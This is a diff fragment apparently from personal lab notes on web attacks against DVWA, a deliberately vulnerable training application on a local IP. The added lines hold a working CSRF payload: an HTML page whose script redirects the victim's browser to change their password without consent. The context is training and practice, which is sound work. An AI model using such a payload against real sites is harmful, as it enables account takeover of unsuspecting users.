@@ -78,7 +78,15 @@ hi this my first msg
 see output in view blogs-
 --------------------------
 now perform csrf attack-
-
+--------------------------
+1. payload -
+<html>
+	<body>
+	<script>
+		document.location="http://192.168.176.128/dvwa/vulnerabilities/csrf/?password_current=password&password_new=password&password_conf=password&Change=Change#";
+	</script>
+	</body>
+</html>
 --------------------------
 first configure foxyproxy on browser
 addon extention in firefox
